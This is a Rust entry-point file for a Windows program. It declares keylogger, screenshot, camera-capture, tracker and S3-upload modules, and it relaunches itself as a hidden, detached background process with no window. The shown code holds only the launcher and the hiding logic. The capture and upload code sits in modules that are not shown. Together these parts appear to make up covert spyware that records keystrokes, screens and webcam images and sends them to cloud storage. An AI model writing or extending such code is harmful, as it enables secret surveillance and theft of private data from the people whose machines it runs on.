use std::error::Error;
use std::process::Command;
use std::os::windows::process::CommandExt; // Import for creation_flags
use std::{env};
use std::sync::atomic::{AtomicBool};
use log::{error, info};
use anyhow::Result;
mod tasks;
mod process;
mod utils;
mod tracker;
mod keylogger;
mod screenshot;
mod camera_capture;
mod s3upload;
mod img;
mod screen;
mod cam;
mod logsetup;
mod orgdetails;
mod config;
mod awscnf;

use process::background::start_background_process;

#[windows_subsystem = "windows"]
use tokio;
use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
use crate::logsetup::logging::{initialize_logging};

#[cfg(windows)]
extern crate winapi;

// Global flag for process state
static RUNNING: AtomicBool = AtomicBool::new(true);

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    if env::args().any(|x| x == "--background") {
        initialize_logging("config/config.toml")?;
        info!("Starting background process...");

        // Start the background process
        start_background_process().await
    } else {
        initialize_logging("config/config.toml")?;
        info!("Initial launch - spawning background process");

        let current_exe = env::current_exe()?;
        let mut command = Command::new(current_exe);
        command.arg("--background");

        // Set creation flags for Windows to hide the window
        command.creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS);

        command.spawn()?;
        info!("Background process spawned successfully. Exiting initial process.");
        std::process::exit(0)
    }
}